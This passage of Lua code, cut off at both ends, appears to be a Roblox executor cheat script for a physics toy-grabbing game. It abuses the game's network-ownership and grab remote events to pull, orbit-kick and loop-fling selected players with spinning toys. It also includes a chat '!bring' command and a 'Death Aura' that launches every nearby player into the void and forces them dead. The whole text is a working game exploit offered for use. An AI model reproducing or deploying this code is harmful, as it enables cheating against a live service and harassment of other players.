                ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner'):FireServer(targetHead, root.CFrame)
                task.wait(0.15)
            end

            task.wait(0.1)

            root.CFrame = oldCFrame

            local front = oldCFrame.LookVector * 5

            targetHead.CFrame = CFrame.new(oldCFrame.Position + front)

            ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('DestroyGrabLine'):FireServer(targetHead)
        end
    end,
})
LocalPlayer.Chatted:Connect(function(msg)
    local args = msg:split(' ')
    local cmd = args[1]:lower()
    local targetName = args[2]
    local prefix = '!bring '
    local lowerMsg = string.lower(msg)

    if string.sub(lowerMsg, 1, #prefix) == prefix then
        local inputName = string.sub(msg, #prefix + 1)

        if not inputName or inputName == '' then
            return
        end

        local foundPlayer = nil

        for _, plr in ipairs(Players:GetPlayers())do
            if string.find(string.lower(plr.DisplayName), string.lower(inputName)) then
                foundPlayer = plr

                break
            end
        end

        if not foundPlayer then
            return
        end

        SelectedPlayer = foundPlayer.Name

        task.spawn(function()
            local Players = game:GetService('Players')
            local ReplicatedStorage = game:GetService('ReplicatedStorage')
            local LocalPlayer = Players.LocalPlayer
            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local root = character:WaitForChild('HumanoidRootPart')
            local oldCFrame = root.CFrame
            local targetPlayer = Players:FindFirstChild(SelectedPlayer)

            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild('Head') then
                local targetHead = targetPlayer.Character.Head

                for i = 1, 2 do
                    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild('Head') then
                        break
                    end

                    root.CFrame = targetHead.CFrame * CFrame.new(2, 0, 0)

                    ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner'):FireServer(targetHead, root.CFrame)
                    task.wait(0.15)
                end

                task.wait(0.1)

                root.CFrame = oldCFrame

                local front = oldCFrame.LookVector * 5

                targetHead.CFrame = CFrame.new(oldCFrame.Position + front)

                ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('DestroyGrabLine'):FireServer(targetHead)
            end
        end)
    end
end)
Tgtnon:AddButton({
    Text = 'Switch Player',
    Func = function()
        if SelectedPlayer then
            task.spawn(SwitchPlayer)
        end
    end,
})
Tgtnon:AddButton({
    Text = 'TP to Water',
    Func = function()
        if SelectedPlayer then
            task.spawn(TPPlayerToWater, SelectedPlayer)
        end
    end,
})

Players = game:GetService('Players')
RunService = game:GetService('RunService')
LocalPlayer = Players.LocalPlayer
CFG = {
    tpOffset = Vector3.new(0, 5, 0),
    trackRate = 0.5,
}
seatLoopActive = false
vncEnabled = false
vncConnection = nil
trackedBlobmans = {}
trackerThread = nil

function getBlobmanCFrame(blobman)
    if not blobman or not blobman.Parent then
        return nil
    end

    local hrp = blobman:FindFirstChild('HumanoidRootPart')

    if hrp then
        return hrp.CFrame
    end

    local seat = blobman:FindFirstChild('VehicleSeat')

    if seat then
        return seat.CFrame
    end
    if blobman.PrimaryPart then
        return blobman:GetPrimaryPartCFrame()
    end

    for _, part in ipairs(blobman:GetChildren())do
        if part:IsA('BasePart') then
            return part.CFrame
        end
    end

    return nil
end
function teleportToBlobman(blobman)
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return false
    end

    local cf = getBlobmanCFrame(blobman)

    if not cf then
        return false
    end

    root.CFrame = CFrame.new(cf.Position + CFG.tpOffset)

    return true
end
function sitOnBlobman(blobman)
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass('Humanoid')
    local seat = blobman and blobman:FindFirstChild('VehicleSeat')

    if not (seat and hum) then
        return false
    end
    if seat.Occupant then
        return false
    end

    seat:Sit(hum)

    return true
end
function findClosestBlobman()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return nil, nil
    end

    local closest, closestDist = nil, math.huge

    for _, obj in ipairs(workspace:GetDescendants())do
        if obj:IsA('Model') and obj.Name == 'CreatureBlobman' then
            local cf = getBlobmanCFrame(obj)

            if cf then
                local d = (root.Position - cf.Position).Magnitude

                if d < closestDist then
                    closestDist = d
                    closest = obj
                end
            end
        end
    end

    return closest, closestDist
end
function sweepBlobmans()
    local folder = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

    if not folder then
        return
    end

    for _, toy in ipairs(folder:GetChildren())do
        if toy:IsA('Model') and toy.Name == 'CreatureBlobman' and not trackedBlobmans[toy] then
            local hitbox = toy:FindFirstChild('GrabbableHitbox')

            if hitbox then
                trackedBlobmans[toy] = hitbox
            end
        end
    end
    for model in pairs(trackedBlobmans)do
        if not model.Parent then
            trackedBlobmans[model] = nil
        end
    end
end
function startTracker()
    if trackerThread then
        return
    end

    trackerThread = task.spawn(function()
        while true do
            sweepBlobmans()
            task.wait(CFG.trackRate)
        end
    end)
end

startTracker()

function startVNC()
    if vncEnabled then
        return
    end

    vncEnabled = true
    vncConnection = RunService.Stepped:Connect(function()
        local char = LocalPlayer.Character

        if not char then
            return
        end

        local hum = char:FindFirstChildOfClass('Humanoid')
        local seat = hum and hum.SeatPart

        if seat and seat:IsA('VehicleSeat') then
            for _, v in ipairs(seat.Parent:GetDescendants())do
                if v:IsA('BasePart') then
                    v.CanCollide = false
                end
            end
        end
    end)
end
function stopVNC()
    vncEnabled = false

    if vncConnection then
        vncConnection:Disconnect()

        vncConnection = nil
    end
end

TgtMisc:AddButton({
    Text = 'Spawn & Sit',
    Tooltip = 'Instantly spawns a blobman and makes you sit on it [ONCE]',
    Func = function()
        local Players = game:GetService('Players')
        local Workspace = game:GetService('Workspace')
        local ReplicatedStorage = game:GetService('ReplicatedStorage')
        local LocalPlayer = Players.LocalPlayer
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass('Humanoid')
        local hrp = char and char:FindFirstChild('HumanoidRootPart')

        if not hrp or not hum then
            return
        end

        local folder = Workspace:WaitForChild(LocalPlayer.Name .. 'SpawnedInToys')
        local spawnedConnection

        spawnedConnection = folder.ChildAdded:Connect(function(child)
            if child.Name == 'CreatureBlobman' then
                if spawnedConnection then
                    spawnedConnection:Disconnect()
                end

                task.spawn(function()
                    local seat = child:WaitForChild('VehicleSeat', 5)

                    if seat and hum then
                        hrp.CFrame = seat.CFrame

                        task.wait(0.1)
                        seat:Sit(hum)
                    end
                end)
            end
        end)

        pcall(function()
            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', hrp.CFrame, Vector3.new(0, 0, 0))
        end)
    end,
})

autoSitBlobEnabled = false
blobSpeed = 16

TgtMisc:AddCheckbox('AutoSitBlob', {
    Text = 'Auto Sit Blobman',
    Default = false,
    Tooltip = 'Automatically spawns a blobman, and instantly sits on it rapidly',
    Callback = function(Value)
        autoSitBlobEnabled = Value

        if Value then
            task.spawn(function()
                while autoSitBlobEnabled do
                    local Char = Player.Character
                    local Hum = Char and Char:FindFirstChildOfClass('Humanoid')
                    local Root = Char and Char:FindFirstChild('HumanoidRootPart')

                    if Hum and Root and not Hum.SeatPart then
                        local folder = Workspace:FindFirstChild(Player.Name .. 'SpawnedInToys')
                        local blob = folder and folder:FindFirstChild('CreatureBlobman')

                        if not blob then
                            pcall(function()
                                ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', Root.CFrame * CFrame.new(0, 5, 5), Vector3.zero)
                            end)

                            local startTime = tick()

                            repeat
                                RunService.Heartbeat:Wait()

                                folder = Workspace:FindFirstChild(Player.Name .. 'SpawnedInToys')
                                blob = folder and folder:FindFirstChild('CreatureBlobman')
                            until blob or tick() - startTime > 5 or not autoSitBlobEnabled
                        end
                        if blob then
                            local seat = blob:FindFirstChildWhichIsA('VehicleSeat') or blob:FindFirstChildWhichIsA('Seat')

                            if seat then
                                Root.CFrame = seat.CFrame * CFrame.new(0, 1, 0)
                                Root.Velocity = Vector3.zero

                                pcall(function()
                                    seat:Sit(Hum)
                                end)
                            end
                        end
                    end

                    task.wait(0.1)
                end
            end)
        end
    end,
})
TgtMisc:AddButton({
    Text = 'Sit on Nearest Blobman',
    Tooltip = 'Finds the closest Blobman and sits on it',
    Func = function()
        local blobman = findClosestBlobman()

        if not blobman then
            return
        end

        sitOnBlobman(blobman)
    end,
})

function findBlobman()
    local toys = workspace:FindFirstChild(Player.Name .. 'SpawnedInToys')

    return toys and toys:FindFirstChild('CreatureBlobman') or nil
end
function spawnBlobman()
    ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5), Vector3.new(0, -15, 0))
end
function ensureBlobman()
    local b = findBlobman()

    if b then
        return b
    end

    spawnBlobman()

    for _ = 1, 30 do
        task.wait(0.1)

        b = findBlobman()

        if b then
            return b
        end
    end

    return nil
end

Players = game:GetService('Players')
RunService = game:GetService('RunService')
LocalPlayer = Players.LocalPlayer
kickLoopActive = false
OrbitRadius = 10
OrbitSpeed = 2
OrbitRotation = 0
HUGE_VECTOR = Vector3.new(math.huge, math.huge, math.huge)

local OrbitConnection, OrbitConnection2

function findMountedBlob()
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChild('Humanoid')

    return (hum and hum.SeatPart and hum.SeatPart.Parent.Name == 'CreatureBlobman') and hum.SeatPart.Parent or nil
end
function blob_kick(blob, hrp, rl, v)
    local detec = blob:FindFirstChild(rl .. 'Detector')

    if not detec then
        return
    end

    local script = blob:FindFirstChild('BlobmanSeatAndOwnerScript')

    if not script then
        return
    end

    local grab = script:FindFirstChild('CreatureGrab')
    local drop = script:FindFirstChild('CreatureDrop')
    local rel = script:FindFirstChild('CreatureRelease')
    local weld = detec:FindFirstChild(rl .. 'Weld')

    pcall(function()
        if v == 'Grab' then
            grab:FireServer(detec, hrp, weld)
        end
        if v == 'Drop' then
            drop:FireServer(weld)
        end
        if v == 'Release' then
            rel:FireServer(weld, hrp)
        end
    end)
end

TgtOrbit:AddCheckbox('BlobKickToggle', {
    Text = 'Blobman Orbit',
    Default = false,
}):OnChanged(function(state)
    kickLoopActive = state
    OrbitRotation = 0

    if not state then
        if OrbitConnection then
            OrbitConnection:Disconnect()
        end
        if OrbitConnection2 then
            OrbitConnection2:Disconnect()
        end

        return
    end

    local targetPlr = getSelectedPlayer()

    if not targetPlr then
        return
    end

    local MyBlob = findMountedBlob()

    if not MyBlob then
        return
    end

    local blobRoot = MyBlob:FindFirstChild('HumanoidRootPart') or MyBlob.PrimaryPart

    if not blobRoot then
        return
    end

    local targetHRP = targetPlr.Character and targetPlr.Character:FindFirstChild('HumanoidRootPart')

    if not targetHRP then
        return
    end
    if targetHRP:FindFirstChild('OrbitBodyPos') then
        targetHRP.OrbitBodyPos:Destroy()
    end

    local bodyPos = Instance.new('BodyPosition')

    bodyPos.Name = 'OrbitBodyPos'
    bodyPos.MaxForce = HUGE_VECTOR
    bodyPos.Position = targetHRP.Position + Vector3.new(0, 20, 0)
    bodyPos.P = 5000
    bodyPos.D = 100
    bodyPos.Parent = targetHRP
    OrbitConnection = RunService.Heartbeat:Connect(function()
        if not kickLoopActive then
            return
        end

        local MyBlob = findMountedBlob()

        if not MyBlob then
            return
        end

        local blobRoot = MyBlob:FindFirstChild('HumanoidRootPart') or MyBlob.PrimaryPart

        if not blobRoot then
            return
        end

        local tPlr = getSelectedPlayer()

        if not tPlr then
            return
        end

        local tHRP = tPlr.Character and tPlr.Character:FindFirstChild('HumanoidRootPart')

        if not tHRP then
            return
        end

        local bodyPos = tHRP:FindFirstChild('OrbitBodyPos')

        if not bodyPos then
            return
        end

        OrbitRotation = OrbitRotation + OrbitSpeed
        blobRoot.CFrame = CFrame.new(bodyPos.Position) * CFrame.Angles(0, math.rad(OrbitRotation), 0) * CFrame.new(OrbitRadius, 0, 0)
        blobRoot.Velocity = Vector3.zero
    end)
    OrbitConnection2 = RunService.RenderStepped:Connect(function()
        if not kickLoopActive then
            return
        end

        local MyBlob = findMountedBlob()

        if not MyBlob then
            return
        end

        local blobRoot = MyBlob:FindFirstChild('HumanoidRootPart') or MyBlob.PrimaryPart

        if not blobRoot then
            return
        end

        local tPlr = getSelectedPlayer()

        if not tPlr then
            return
        end

        local tHRP = tPlr.Character and tPlr.Character:FindFirstChild('HumanoidRootPart')

        if not tHRP then
            return
        end

        local bodyPos = tHRP:FindFirstChild('OrbitBodyPos')

        if not bodyPos then
            return
        end

        blobRoot.CFrame = CFrame.new(blobRoot.Position, bodyPos.Position)
    end)

    task.spawn(function()
        while kickLoopActive do
            local tPlr = getSelectedPlayer()

            if not tPlr then
                break
            end

            local char = tPlr.Character
            local hrp = char and char:FindFirstChild('HumanoidRootPart')
            local hum = char and char:FindFirstChild('Humanoid')
            local MyBlob = findMountedBlob()

            if not (MyBlob and hrp and hum and hum.Health > 0) then
                task.wait(0.1)

                continue
            end

            for i = 1, 8 do
                blob_kick(MyBlob, hrp, 'Left', 'Grab')
                blob_kick(MyBlob, hrp, 'Right', 'Grab')
                task.wait(0.001)
                blob_kick(MyBlob, hrp, 'Left', 'Drop')
                blob_kick(MyBlob, hrp, 'Right', 'Drop')
            end

            task.wait(0.01)
        end
    end)
end)
TgtOrbit:AddSlider('OrbitRadius', {
    Text = 'Orbit Radius',
    Default = 10,
    Min = 5,
    Max = 35,
    Rounding = 0,
}):OnChanged(function(v)
    OrbitRadius = v
end)
TgtOrbit:AddSlider('OrbitSpeed', {
    Text = 'Orbit Speed',
    Default = 2,
    Min = 1,
    Max = 40,
    Rounding = 0,
}):OnChanged(function(v)
    OrbitSpeed = v
end)

players = game:GetService('Players')
RunService = game:GetService('RunService')
Workspace = game:GetService('Workspace')
ReplicatedStorage = game:GetService('ReplicatedStorage')
rs = ReplicatedStorage
DestroyToy = rs.MenuToys.DestroyToy
SetNetOwner = rs.GrabEvents.SetNetworkOwner
DestroyLine = rs.GrabEvents.DestroyGrabLine
Struggle = rs.CharacterEvents.Struggle
plr = Players.LocalPlayer
char = plr.Character
hum = char and char:FindFirstChild('Humanoid')
HRP = char and char:FindFirstChild('HumanoidRootPart')
inv = Workspace[plr.Name .. 'SpawnedInToys']

plr.CharacterAdded:Connect(function(c)
    task.wait(0.1)

    char = c
    hum = c:WaitForChild('Humanoid')
    HRP = c:WaitForChild('HumanoidRootPart')
end)

function getname(v)
    return v:split(' ')[2]:split('(')[2]:split(')')[1]
end
function sno(obj)
    SetNetOwner:FireServer(obj, obj.CFrame)
end
function isnetworkowner(part)
    local succ, result = pcall(function()
        return part:IsNetworkOwner()
    end)

    return succ and result
end
function getplot()
    for i = 1, 5 do
        local plot = Workspace.Plots:FindFirstChild('Plot' .. i)
        local value = plot and plot:FindFirstChild('PlotSign') and plot.PlotSign.ThisPlotsOwners:FindFirstChild('Value')

        if plot and value and value.Value:find(plr.Name) then
            return plot
        end
    end
end
function spawntoy(toy, cf)
    if not plr.CanSpawnToy.Value then
        plr.CanSpawnToy.Changed:Wait()
    end

    local t
    local toyadded = inv.ChildAdded:Connect(function(c)
        if c.Name == toy then
            t = c

            toyadded:Disconnect()
        end
    end)

    task.spawn(function()
        rs.MenuToys.SpawnToyRemoteFunction:InvokeServer(toy, cf, Vector3.new(0, 0, 0))
    end)

    local timeout = tick() + 1

    repeat
        task.wait()
    until t or tick() > timeout

    if t then
        return t
    else
        local plot = getplot()

        if plot then
            return Workspace.PlotItems[plot.Name]:FindFirstChild(toy) or Workspace.PlotItems[plot.Name]:WaitForChild(toy, 0.5)
        end
    end
end
function stvel(hrp)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end
function gblob()
    if hum and hum.SeatPart and hum.SeatPart.Parent.Name == 'CreatureBlobman' then
        return hum.SeatPart.Parent
    end
end
function tp(obj1, obj2)
    obj1.CFrame = CFrame.new(obj2.Position + (obj2.Velocity * (game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue() / 1000) * 5))
end

PanelTools = Tabs.Grab:AddLeftGroupbox('Grab Controls', 'hand-grab')
PanelThrow = Tabs.Grab:AddRightGroupbox('Grab Settings', 'sliders-horizontal')
PanelNet = Tabs.Grab:AddRightGroupbox('Network Toggles', 'server')
PanelAssist = Tabs.Grab:AddRightGroupbox('Player Assist', 'mouse-pointer-2')
ControlPanel = Tabs.Grab:AddRightGroupbox('Control', 'user-cog')
PanelLoopTP = Tabs.Grab:AddLeftGroupbox('Loop Teleport', 'refresh-ccw')
Groupbox = Tabs.Grab:AddLeftGroupbox('Object Flinger', 'box')
Players = game:GetService('Players')
me = Players.LocalPlayer
rs = game:GetService('ReplicatedStorage')
w = game:GetService('Workspace')
SelectedPlayers = {}
playerNames = {}

for _, p in ipairs(Players:GetPlayers())do
    if p ~= me then
        table.insert(playerNames, p.Name)
    end
end

Players.PlayerAdded:Connect(function(p)
    if p ~= me then
        table.insert(playerNames, p.Name)
    end
end)
Groupbox:AddDropdown('TargetPlayers', {
    Values = playerNames,
    Default = playerNames[1] or '',
    Multi = true,
    Text = 'Select Players',
})
Options.TargetPlayers:OnChanged(function(selected)
    SelectedPlayers = {}

    for name, enabled in pairs(selected)do
        if enabled then
            table.insert(SelectedPlayers, name)
        end
    end

    print('[Selected Players]:', SelectedPlayers)

    for _, player in ipairs(Players:GetPlayers())do
        if player ~= me then
            local isSelected = false

            for _, name in ipairs(SelectedPlayers)do
                if player.Name == name then
                    isSelected = true

                    break
                end
            end

            player:SetAttribute('IsAdded', isSelected)
        end
    end
end)

function isPlayerSelected(player)
    for _, name in ipairs(SelectedPlayers)do
        if player.Name == name then
            return true
        end
    end

    return false
end

Players.PlayerAdded:Connect(function(player)
    task.wait(0.5)

    if player ~= me then
        player:SetAttribute('IsAdded', isPlayerSelected(player))
    end
end)
Players.PlayerRemoving:Connect(function(player)
    for i, name in ipairs(SelectedPlayers)do
        if name == player.Name then
            table.remove(SelectedPlayers, i)

            break
        end
    end
end)

for _, player in ipairs(Players:GetPlayers())do
    if player ~= me then
        player:SetAttribute('IsAdded', false)
    end
end

getgenv().Players = game:GetService('Players')
getgenv().ReplicatedStorage = game:GetService('ReplicatedStorage')
getgenv().RunService = game:GetService('RunService')
getgenv().Workspace = game:GetService('Workspace')
getgenv().lp = Players.LocalPlayer
getgenv().char = lp.Character or lp.CharacterAdded:Wait()
getgenv().root = char:WaitForChild('HumanoidRootPart')
getgenv().folder = Workspace:WaitForChild(lp.Name .. 'SpawnedInToys')
getgenv().isProcessing = false
getgenv().isEnabled = false
getgenv().targetIndex = 1
getgenv().flungMap = {}
getgenv().currentDecoy = nil
getgenv().currentTarget = nil
getgenv().conn = nil
getgenv().UNIQUE_ATTRIBUTE = 'OwnedByScript'
getgenv().FLING_FORCE = 500
getgenv().ownershipMonitors = {}
getgenv().SelectedPlayers = {}
getgenv().toyMap = {
    YouLittle = 'Head',
    YouDecoy = 'Head',
    DiceSmall = 'SoundPart',
    DiceBig = 'SoundPart',
}
getgenv().selectedToy = 'DiceBig'
getgenv().getTargets = function()
    getgenv().targetsList = {}

    for _, p in ipairs(Players:GetPlayers())do
        if p ~= lp and p:GetAttribute('IsAdded') and p.Character and p.Character:FindFirstChild('HumanoidRootPart') then
            table.insert(getgenv().targetsList, p)
        end
    end

    return getgenv().targetsList
end
getgenv().velocityHistory = {}
getgenv().isFlung = function(p)
    local h = p.Character and p.Character:FindFirstChild('HumanoidRootPart')

    if not h then
        return true
    end

    local posY = h.Position.Y
    local v = h.Velocity
    local horizontalMag = Vector3.new(v.X, 0, v.Z).Magnitude

    if not velocityHistory[p] then
        velocityHistory[p] = {}
    end

    local hist = velocityHistory[p]

    table.insert(hist, {
        tick(),
        v,
        posY,
    })

    if #hist > 15 then
        table.remove(hist, 1)
    end

    local heightOK = posY > -100 and posY < 1500
    local verticalOK = math.abs(v.Y) < 180
    local horizOK = horizontalMag < 250
    local badFrames = 0

    for _, data in ipairs(hist)do
        local vel = data[2]
        local y = data[3]

        if y > 3000 or y < -150 then
            badFrames += 1
        elseif math.abs(vel.Y) > 220 or Vector3.new(vel.X, 0, vel.Z).Magnitude > 300 then
            badFrames += 1
        end
    end

    if badFrames / #hist >= 0.4 then
        return true
    end

    return false
end
getgenv().isGrounded = function(p)
    local h = p.Character and p.Character:FindFirstChild('HumanoidRootPart')

    return h and h.Position.Y < 100 and math.abs(h.Velocity.Y) < 10
end
getgenv().pickNextTarget = function(targets)
    local c = #targets

    if c == 0 then
        return nil
    end

    for i = 1, c do
        targetIndex = ((targetIndex + i - 1) % c) + 1

        local t = targets[targetIndex]

        if not flungMap[t] or isGrounded(t) then
            return t
        end
    end

    return nil
end
getgenv().monitorOwnership = function(toy, toyPart)
    if ownershipMonitors[toy] then
        ownershipMonitors[toy]:Disconnect()

        ownershipMonitors[toy] = nil
    end

    ownershipMonitors[toy] = RunService.Heartbeat:Connect(function()
        if not toy or not toy.Parent then
            if ownershipMonitors[toy] then
                ownershipMonitors[toy]:Disconnect()

                ownershipMonitors[toy] = nil
            end

            return
        end

        local tag = toyPart:FindFirstChild('PartOwner')

        if tag and tag:IsA('StringValue') and tag.Value ~= lp.Name and tag.Value ~= '' then
            print('[Ownership Monitor] Ownership changed to: ' .. tag.Value .. ' - Destroying toy')
            rs.MenuToys.DestroyToy:FireServer(toy)

            if toy == currentDecoy then
                currentDecoy = nil
            end
            if ownershipMonitors[toy] then
                ownershipMonitors[toy]:Disconnect()

                ownershipMonitors[toy] = nil
            end
        end
    end)
end
getgenv().spawnDecoy = function()
    if currentDecoy and currentDecoy.Parent then
        return
    end

    local toy = selectedToy or 'YouDecoy'

    rs.MenuToys.SpawnToyRemoteFunction:InvokeServer(toy, root.CFrame * CFrame.new(5, 0, 5), Vector3.new(0, 33, 0))
end
getgenv().handleDecoy = function(d)
    if currentDecoy and currentDecoy.Parent then
        return
    end

    local partName = toyMap[d.Name]

    if not partName then
        return
    end

    local toyPart = d:WaitForChild(partName)
    local pivotCF = d:GetPivot()

    rs.GrabEvents.SetNetworkOwner:FireServer(toyPart, pivotCF)
    task.wait(0.09)

    local startTime = tick()
    local success = false
    local connection

    connection = RunService.Heartbeat:Connect(function()
        local tag = toyPart:FindFirstChild('PartOwner')

        if tag and tag:IsA('StringValue') and tag.Value == lp.Name then
            success = true

            connection:Disconnect()

            if not d:GetAttribute(UNIQUE_ATTRIBUTE) then
                d:SetAttribute(UNIQUE_ATTRIBUTE, true)

                currentDecoy = d

                monitorOwnership(d, toyPart)

                if isEnabled then
                    setupFling(d)
                end
            end
        end
        if tick() - startTime >= 3 and not success then
            rs.MenuToys.DestroyToy:FireServer(d)
            connection:Disconnect()
        end
    end)
end

folder.ChildAdded:Connect(function(c)
    if toyMap[c.Name] then
        handleDecoy(c)
    end
end)
folder.ChildRemoved:Connect(function(c)
    if c == currentDecoy then
        currentDecoy = nil
    end
    if ownershipMonitors[c] then
        ownershipMonitors[c]:Disconnect()

        ownershipMonitors[c] = nil
    end
end)
RunService.Heartbeat:Connect(function()
    if not currentDecoy or not currentDecoy.Parent then
        for _, t in ipairs(folder:GetChildren())do
            if toyMap[t.Name] and t:GetAttribute(UNIQUE_ATTRIBUTE) then
                currentDecoy = t

                local toyPart = t:FindFirstChild(toyMap[t.Name])

                if toyPart and not ownershipMonitors[t] then
                    monitorOwnership(t, toyPart)
                end

                return
            end
        end

        if isEnabled then
            spawnDecoy()
        end
    end
end)

getgenv().setupFling = function(d)
    local hrp = d:FindFirstChild('HumanoidRootPart') or d.PrimaryPart or d:FindFirstChild(toyMap[d.Name])

    if not hrp then
        return
    end

    d.PrimaryPart = hrp
    hrp.CanCollide = false

    local bt = Instance.new('BodyThrust')

    bt.Force = Vector3.zero
    bt.Parent = hrp

    local bav = Instance.new('BodyAngularVelocity')

    bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bav.AngularVelocity = Vector3.new(-1E6, -1E6, -1E6)
    bav.Parent = hrp

    local params = RaycastParams.new()

    params.FilterType = Enum.RaycastFilterType.Blacklist
    params.FilterDescendantsInstances = {
        lp.Character,
        d,
    }
    params.IgnoreWater = true
    conn = RunService.Heartbeat:Connect(function()
        if not d or not d.Parent or not isEnabled then
            if conn then
                conn:Disconnect()
            end
            if bt.Parent then
                bt:Destroy()
            end
            if bav.Parent then
                bav:Destroy()
            end

            return
        end

        w.FallenPartsDestroyHeight = 0 / 0

        local tList = getTargets()

        for p in pairs(flungMap)do
            if not table.find(tList, p) or not p.Character or isGrounded(p) then
                flungMap[p] = nil
            end
        end

        if currentTarget and (not currentTarget.Character or isFlung(currentTarget)) then
            flungMap[currentTarget] = true
            currentTarget = nil
        end
        if not currentTarget then
            currentTarget = pickNextTarget(tList)
        end

        local destCF

        if currentTarget and currentTarget.Character then
            local tHRP = currentTarget.Character:FindFirstChild('HumanoidRootPart')

            if tHRP then
                local vel = tHRP.Velocity
                local speed = vel.Magnitude
                local time = math.clamp(speed / 40, 0.25, 0.6)
                local predicted = tHRP.Position + vel * time + Vector3.new(0, 2, 0)
                local dir = (predicted - hrp.Position).Unit
                local dist = (predicted - hrp.Position).Magnitude
                local result = w:Raycast(hrp.Position, dir * dist, params)

                if result and result.Instance and result.Instance:IsDescendantOf(currentTarget.Character) then
                    destCF = CFrame.new(result.Position)
                else
                    destCF = CFrame.new(predicted)
                end
            end
        end
        if not destCF then
            destCF = CFrame.new(0, 5000, 0)
        end

        for _, p in ipairs(d:GetDescendants())do
            if p:IsA('BasePart') then
                p.CFrame = destCF
            end
        end

        if bt.Parent then
            bt.Force = (destCF.Position - hrp.Position).Unit * FLING_FORCE
        end
    end)
end

lp.CharacterAdded:Connect(function(newChar)
    getgenv().char = newChar
    getgenv().root = newChar:WaitForChild('HumanoidRootPart')

    print('[Respawn] Character and HumanoidRootPart updated')
end)
lp.CharacterRemoving:Connect(function(oldChar)
    if char == oldChar then
        getgenv().char, getgenv().root = nil, nil
    end
end)

getgenv().process = function()
    if isProcessing then
        return
    end

    isProcessing = true

    if not currentDecoy or not currentDecoy.Parent or not currentDecoy:GetAttribute(UNIQUE_ATTRIBUTE) then
        if isEnabled then
            spawnDecoy()
        end
    else
        setupFling(currentDecoy)
    end

    isProcessing = false
end

Groupbox:AddCheckbox('LoopFlingToggle', {
    Text = 'Loop Fling Target',
    Tooltip = 'Loop fling the selected target with the selected object',
    Default = false,
})
Toggles.LoopFlingToggle:OnChanged(function(state)
    isEnabled = state

    if state then
        process()
    else
        isProcessing = false

        if conn then
            conn:Disconnect()
        end

        for toy, mon in pairs(ownershipMonitors)do
            mon:Disconnect()
        end

        ownershipMonitors = {}

        if currentDecoy and currentDecoy.Parent then
            rs.MenuToys.DestroyToy:FireServer(currentDecoy)
        end

        currentDecoy = nil
    end
end)
Groupbox:AddDropdown('FlingToyDropdown', {
    Values = {
        'YouLittle',
        'YouDecoy',
        'DiceSmall',
        'DiceBig',
    },
    Default = 'DiceBig',
    Multi = false,
    Text = 'Fling Toy',
})
Options.FlingToyDropdown:OnChanged(function(option)
    selectedToy = option

    print('[Fling Toy Selected] -> ' .. selectedToy)
end)

SetNetworkOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
DestroyGrabLine = ReplicatedStorage.GrabEvents.DestroyGrabLine
Toggles = Library.Toggles
Options = Library.Options

function isFriend(player)
    return false
end
function canInteractWithTarget(targetChar)
    return true
end
function handlePartOwner(targetChar, callback)
    local root = targetChar:FindFirstChild('HumanoidRootPart')

    if root then
        SetNetworkOwner:FireServer(root, root.CFrame)
        callback()
    end
end

deathAuraConnection = nil

function startDeathAura()
    deathAuraConnection = RunService.Heartbeat:Connect(function()
        local c = LocalPlayer.Character
        local hrp = c and c:FindFirstChild('HumanoidRootPart')

        if not hrp then
            return
        end

        for _, player in pairs(Players:GetPlayers())do
            if player == LocalPlayer or isFriend(player) then
                continue
            end

            local targetChar = player.Character

            if not targetChar or not canInteractWithTarget(targetChar) then
                continue
            end

            local tRoot = targetChar:FindFirstChild('HumanoidRootPart')
            local tHum = targetChar:FindFirstChild('Humanoid')

            if not (tRoot and tHum) then
                continue
            end
            if (hrp.Position - tRoot.Position).Magnitude > 29 then
                continue
            end

            SetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
            DestroyGrabLine:FireServer(tRoot)
            handlePartOwner(targetChar, function()
                for _, part in pairs(tHum.Parent:GetChildren())do
                    if part:IsA('BasePart') then
                        part.CFrame = CFrame.new(-9E11, 9e12, -9E11)
                    end
                end

                task.wait()

                for _, part in pairs(tHum.Parent:GetChildren())do
                    if part:IsA('BasePart') then
                        part.CFrame = CFrame.new(-9E11, 9e12, -9E11)
                    end
                end

                local bv = Instance.new('BodyVelocity')

                bv.Velocity = Vector3.new(0, 9e10, 0)
                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bv.P = 100000075
                bv.Parent = tRoot
                tHum.BreakJointsOnDeath = false

                tHum:ChangeState(Enum.HumanoidStateType.Dead)
                task.delay(2, function()
                    if bv and bv.Parent then
                        bv:Destroy()
                    end
                end)
            end)
        end
    end)
end
function stopDeathAura()
    if deathAuraConnection then
        deathAuraConnection:Disconnect()

        deathAuraConnection = nil
    end
end

local AuraBox = Tabs.Grab:AddRightGroupbox('Auras', 'skull')
local auraConn

state = {
    KillAura = false,
    ThrowAura = false,
    TeleportAura = false,
    AirAura = false,
}
throwSpeed = 100
throwRadius = 30
throwBodies = {}
teleportTarget = 'Clouds'
teleportBodies = {}
teleportGyros = {}
airSpeed = 50
airBodies = {}
TELEPORT_LOCATIONS = {
    Spawn = Vector3.new(0, 0, 0),
    Clouds = Vector3.new(900000, 100, 3000),
    Void = Vector3.new(0, 1e12, 0),
}

function startAuraLoop()
    if auraConn then
        return
    end

    auraConn = RunService.Heartbeat:Connect(function()
